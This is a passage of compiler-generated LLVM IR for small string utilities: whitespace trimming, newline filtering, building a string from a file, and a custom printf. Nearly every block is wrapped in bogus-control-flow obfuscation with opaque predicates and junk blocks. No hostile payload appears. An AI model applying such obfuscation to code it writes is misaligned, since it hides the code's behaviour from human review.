  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %84

; <label>:84:                                     ; preds = %originalBBpart211, %originalBBpart27
  %85 = phi i1 [ false, %originalBBpart27 ], [ %75, %originalBBpart211 ]
  %86 = load i32, i32* @x.3
  %87 = load i32, i32* @y.4
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %84
  %94 = load i32, i32* @x.3
  %95 = load i32, i32* @y.4
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %85, label %102, label %121

; <label>:102:                                    ; preds = %originalBBpart215
  %103 = load i32, i32* @x.3
  %104 = load i32, i32* @y.4
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %102
  %111 = load i32, i32* %5, align 4
  %112 = add nsw i32 %111, -1
  store i32 %112, i32* %5, align 4
  %113 = load i32, i32* @x.3
  %114 = load i32, i32* @y.4
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart227, label %originalBB17alteredBB

originalBBpart227:                                ; preds = %originalBB17
  br label %39

; <label>:121:                                    ; preds = %originalBBpart215
  %122 = load i32, i32* @x.3
  %123 = load i32, i32* @y.4
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %121
  %130 = load i32, i32* %4, align 4
  store i32 %130, i32* %3, align 4
  %131 = load i32, i32* @x.3
  %132 = load i32, i32* @y.4
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %139

; <label>:139:                                    ; preds = %originalBBpart255, %originalBBpart231
  %140 = load i32, i32* @x.3
  %141 = load i32, i32* @y.4
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %139
  %148 = load i32, i32* %3, align 4
  %149 = load i32, i32* %5, align 4
  %150 = icmp sle i32 %148, %149
  %151 = load i32, i32* @x.3
  %152 = load i32, i32* @y.4
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %150, label %159, label %190

; <label>:159:                                    ; preds = %originalBBpart235
  %160 = load i8*, i8** %2, align 8
  %161 = load i32, i32* %3, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = load i8*, i8** %2, align 8
  %166 = load i32, i32* %3, align 4
  %167 = load i32, i32* %4, align 4
  %168 = sub nsw i32 %166, %167
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8, i8* %165, i64 %169
  store i8 %164, i8* %170, align 1
  br label %171

; <label>:171:                                    ; preds = %159
  %172 = load i32, i32* @x.3
  %173 = load i32, i32* @y.4
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %171
  %180 = load i32, i32* %3, align 4
  %181 = add nsw i32 %180, 1
  store i32 %181, i32* %3, align 4
  %182 = load i32, i32* @x.3
  %183 = load i32, i32* @y.4
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart255, label %originalBB37alteredBB

originalBBpart255:                                ; preds = %originalBB37
  br label %139

; <label>:190:                                    ; preds = %originalBBpart235
  %191 = load i8*, i8** %2, align 8
  %192 = load i32, i32* %3, align 4
  %193 = load i32, i32* %4, align 4
  %194 = sub nsw i32 %192, %193
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i8, i8* %191, i64 %195
  store i8 0, i8* %196, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %197 = load i32, i32* %4, align 4
  %_ = sub i32 %197, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %197
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 0, %197
  %gen4 = add i32 %_3, 1
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %4, align 4
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %39
  %199 = load i32, i32* %5, align 4
  %200 = load i32, i32* %4, align 4
  %201 = icmp sge i32 %199, %200
  br label %originalBB5

originalBB9alteredBB:                             ; preds = %originalBB9, %59
  %202 = load i8*, i8** %2, align 8
  %203 = load i32, i32* %5, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i8, i8* %202, i64 %204
  %206 = load i8, i8* %205, align 1
  %207 = sext i8 %206 to i32
  %208 = call i32 @isspace(i32 %207) #10
  %209 = icmp ne i32 %208, 0
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %84
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %102
  %210 = load i32, i32* %5, align 4
  %_18 = sub i32 %210, -1
  %gen19 = mul i32 %_18, -1
  %_20 = sub i32 %210, -1
  %gen21 = mul i32 %_20, -1
  %_22 = shl i32 %210, -1
  %_23 = sub i32 %210, -1
  %gen24 = mul i32 %_23, -1
  %_25 = shl i32 %210, -1
  %211 = add nsw i32 %210, -1
  store i32 %211, i32* %5, align 4
  br label %originalBB17

originalBB29alteredBB:                            ; preds = %originalBB29, %121
  %212 = load i32, i32* %4, align 4
  store i32 %212, i32* %3, align 4
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %139
  %213 = load i32, i32* %3, align 4
  %214 = load i32, i32* %5, align 4
  %215 = icmp sle i32 %213, %214
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %171
  %216 = load i32, i32* %3, align 4
  %_38 = sub i32 0, %216
  %gen39 = add i32 %_38, 1
  %_40 = sub i32 %216, 1
  %gen41 = mul i32 %_40, 1
  %_42 = sub i32 0, %216
  %gen43 = add i32 %_42, 1
  %_44 = shl i32 %216, 1
  %_45 = sub i32 0, %216
  %gen46 = add i32 %_45, 1
  %_47 = shl i32 %216, 1
  %_48 = sub i32 %216, 1
  %gen49 = mul i32 %_48, 1
  %_50 = sub i32 %216, 1
  %gen51 = mul i32 %_50, 1
  %_52 = sub i32 0, %216
  %gen53 = add i32 %_52, 1
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %3, align 4
  br label %originalBB37
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @filter(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %39, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* %5) #10
  %7 = sub i64 %6, 1
  %8 = getelementptr inbounds i8, i8* %4, i64 %7
  %9 = load i8, i8* %8, align 1
  %10 = sext i8 %9 to i32
  %11 = icmp eq i32 %10, 13
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %3
  %13 = load i32, i32* @x.5
  %14 = load i32, i32* @y.6
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i8*, i8** %2, align 8
  %22 = load i8*, i8** %2, align 8
  %23 = call i64 @strlen(i8* %22) #10
  %24 = sub i64 %23, 1
  %25 = getelementptr inbounds i8, i8* %21, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = icmp eq i32 %27, 10
  %29 = load i32, i32* @x.5
  %30 = load i32, i32* @y.6
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:37:                                     ; preds = %originalBBpart2, %3
  %38 = phi i1 [ true, %3 ], [ %28, %originalBBpart2 ]
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %2, align 8
  %41 = load i8*, i8** %2, align 8
  %42 = call i64 @strlen(i8* %41) #10
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i8, i8* %40, i64 %43
  store i8 0, i8* %44, align 1
  br label %3

; <label>:45:                                     ; preds = %37
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %12
  %46 = load i8*, i8** %2, align 8
  %47 = load i8*, i8** %2, align 8
  %48 = call i64 @strlen(i8* %47) #10
  %_ = sub i64 0, %48
  %gen = add i64 %_, 1
  %49 = sub i64 %48, 1
  %50 = getelementptr inbounds i8, i8* %46, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 10
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @makestring() #0 {
  %1 = load i32, i32* @x.7
  %2 = load i32, i32* @y.8
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct._IO_FILE*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca [1024 x i8], align 16
  %16 = call i32 @rand() #5
  %17 = srem i32 %16, 5
  %18 = add nsw i32 %17, 4
  store i32 %18, i32* %10, align 4
  %19 = load i32, i32* %10, align 4
  %20 = add nsw i32 %19, 1
  %21 = sext i32 %20 to i64
  %22 = call noalias i8* @malloc(i64 %21) #5
  store i8* %22, i8** %9, align 8
  %23 = load i8*, i8** %9, align 8
  %24 = load i32, i32* %10, align 4
  %25 = add nsw i32 %24, 1
  %26 = sext i32 %25 to i64
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 %26, i32 1, i1 false)
  %27 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0))
  store %struct._IO_FILE* %27, %struct._IO_FILE** %12, align 8
  %28 = icmp eq %struct._IO_FILE* %27, null
  %29 = load i32, i32* @x.7
  %30 = load i32, i32* @y.8
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %87

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* @x.7
  %39 = load i32, i32* @y.8
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %37
  store i32 0, i32* %11, align 4
  %46 = load i32, i32* @x.7
  %47 = load i32, i32* @y.8
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %54

; <label>:54:                                     ; preds = %67, %originalBBpart229
  %55 = load i32, i32* %11, align 4
  %56 = load i32, i32* %10, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %70

; <label>:58:                                     ; preds = %54
  %59 = call i32 @rand() #5
  %60 = srem i32 %59, 26
  %61 = add nsw i32 %60, 65
  %62 = trunc i32 %61 to i8
  %63 = load i8*, i8** %9, align 8
  %64 = load i32, i32* %11, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  store i8 %62, i8* %66, align 1
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %11, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %11, align 4
  br label %54

; <label>:70:                                     ; preds = %54
  %71 = load i32, i32* @x.7
  %72 = load i32, i32* @y.8
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %70
  %79 = load i32, i32* @x.7
  %80 = load i32, i32* @y.8
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %132

; <label>:87:                                     ; preds = %originalBBpart2
  %88 = call i32 @rand() #5
  %89 = call i32 @rand() #5
  %90 = mul nsw i32 %88, %89
  %91 = srem i32 %90, 45402
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %14, align 4
  store i32 0, i32* %11, align 4
  br label %93

; <label>:93:                                     ; preds = %101, %87
  %94 = load i32, i32* %11, align 4
  %95 = load i32, i32* %14, align 4
  %96 = icmp slt i32 %94, %95
  br i1 %96, label %97, label %104

; <label>:97:                                     ; preds = %93
  %98 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %99 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %100 = call i8* @fgets(i8* %98, i32 1024, %struct._IO_FILE* %99)
  br label %101

; <label>:101:                                    ; preds = %97
  %102 = load i32, i32* %11, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %11, align 4
  br label %93

; <label>:104:                                    ; preds = %93
  %105 = load i32, i32* @x.7
  %106 = load i32, i32* @y.8
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %104
  %113 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %113, i8 0, i64 1024, i32 16, i1 false)
  %114 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %115 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %116 = call i8* @fgets(i8* %114, i32 1024, %struct._IO_FILE* %115)
  %117 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  call void @filter(i8* %117)
  %118 = load i8*, i8** %9, align 8
  %119 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %120 = load i32, i32* %10, align 4
  %121 = sext i32 %120 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %118, i8* %119, i64 %121, i32 1, i1 false)
  %122 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %123 = call i32 @fclose(%struct._IO_FILE* %122)
  %124 = load i32, i32* @x.7
  %125 = load i32, i32* @y.8
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %132

; <label>:132:                                    ; preds = %originalBBpart237, %originalBBpart233
  %133 = load i8*, i8** %9, align 8
  ret i8* %133

originalBBalteredBB:                              ; preds = %originalBB, %0
  %134 = alloca i8*, align 8
  %135 = alloca i32, align 4
  %136 = alloca i32, align 4
  %137 = alloca %struct._IO_FILE*, align 8
  %138 = alloca i8*, align 8
  %139 = alloca i32, align 4
  %140 = alloca [1024 x i8], align 16
  %141 = call i32 @rand() #5
  %_ = sub i32 0, %141
  %gen = add i32 %_, 5
  %_1 = sub i32 0, %141
  %gen2 = add i32 %_1, 5
  %_3 = sub i32 %141, 5
  %gen4 = mul i32 %_3, 5
  %_5 = sub i32 %141, 5
  %gen6 = mul i32 %_5, 5
  %_7 = shl i32 %141, 5
  %142 = srem i32 %141, 5
  %_8 = sub i32 0, %142
  %gen9 = add i32 %_8, 4
  %_10 = sub i32 0, %142
  %gen11 = add i32 %_10, 4
  %_12 = sub i32 %142, 4
  %gen13 = mul i32 %_12, 4
  %143 = add nsw i32 %142, 4
  store i32 %143, i32* %135, align 4
  %144 = load i32, i32* %135, align 4
  %_14 = shl i32 %144, 1
  %_15 = sub i32 0, %144
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 %144, 1
  %gen18 = mul i32 %_17, 1
  %_19 = sub i32 %144, 1
  %gen20 = mul i32 %_19, 1
  %145 = add nsw i32 %144, 1
  %146 = sext i32 %145 to i64
  %147 = call noalias i8* @malloc(i64 %146) #5
  store i8* %147, i8** %134, align 8
  %148 = load i8*, i8** %134, align 8
  %149 = load i32, i32* %135, align 4
  %_21 = shl i32 %149, 1
  %_22 = sub i32 0, %149
  %gen23 = add i32 %_22, 1
  %_24 = sub i32 0, %149
  %gen25 = add i32 %_24, 1
  %_26 = shl i32 %149, 1
  %150 = add nsw i32 %149, 1
  %151 = sext i32 %150 to i64
  call void @llvm.memset.p0i8.i64(i8* %148, i8 0, i64 %151, i32 1, i1 false)
  %152 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0))
  store %struct._IO_FILE* %152, %struct._IO_FILE** %137, align 8
  %153 = icmp eq %struct._IO_FILE* %152, null
  br label %originalBB

originalBB27alteredBB:                            ; preds = %originalBB27, %37
  store i32 0, i32* %11, align 4
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %70
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %104
  %154 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %154, i8 0, i64 1024, i32 16, i1 false)
  %155 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %156 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %157 = call i8* @fgets(i8* %155, i32 1024, %struct._IO_FILE* %156)
  %158 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  call void @filter(i8* %158)
  %159 = load i8*, i8** %9, align 8
  %160 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %161 = load i32, i32* %10, align 4
  %162 = sext i32 %161 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %159, i8* %160, i64 %162, i32 1, i1 false)
  %163 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %164 = call i32 @fclose(%struct._IO_FILE* %163)
  br label %originalBB35
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

declare i32 @fclose(%struct._IO_FILE*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = load i32, i32* @x.9
  %3 = load i32, i32* @y.10
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %10, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %10, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %16 = call i32 @print(i8** null, i8* %14, %struct.__va_list_tag* %15)
  %17 = load i32, i32* @x.9
  %18 = load i32, i32* @y.10
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %16

originalBBalteredBB:                              ; preds = %originalBB, %1
  %25 = alloca i8*, align 8
  %26 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %25, align 8
  %27 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %28 = bitcast %struct.__va_list_tag* %27 to i8*
  call void @llvm.va_start(i8* %28)
  %29 = load i8*, i8** %25, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %31 = call i32 @print(i8** null, i8* %29, %struct.__va_list_tag* %30)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %603, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %606

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %562

; <label>:22:                                     ; preds = %17
  %23 = load i32, i32* @x.11
  %24 = load i32, i32* @y.12
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i8*, i8** %5, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %33 = load i8*, i8** %5, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  %37 = load i32, i32* @x.11
  %38 = load i32, i32* @y.12
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %62

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.11
  %47 = load i32, i32* @y.12
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i32, i32* @x.11
  %55 = load i32, i32* @y.12
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %606

; <label>:62:                                     ; preds = %originalBBpart2
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 37
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %62
  br label %579

; <label>:68:                                     ; preds = %62
  %69 = load i32, i32* @x.11
  %70 = load i32, i32* @y.12
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 45
  %81 = load i32, i32* @x.11
  %82 = load i32, i32* @y.12
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %80, label %89, label %92

; <label>:89:                                     ; preds = %originalBBpart28
  %90 = load i8*, i8** %5, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %92

; <label>:92:                                     ; preds = %89, %originalBBpart28
  br label %93

; <label>:93:                                     ; preds = %114, %92
  %94 = load i32, i32* @x.11
  %95 = load i32, i32* @y.12
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %93
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 48
  %106 = load i32, i32* @x.11
  %107 = load i32, i32* @y.12
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
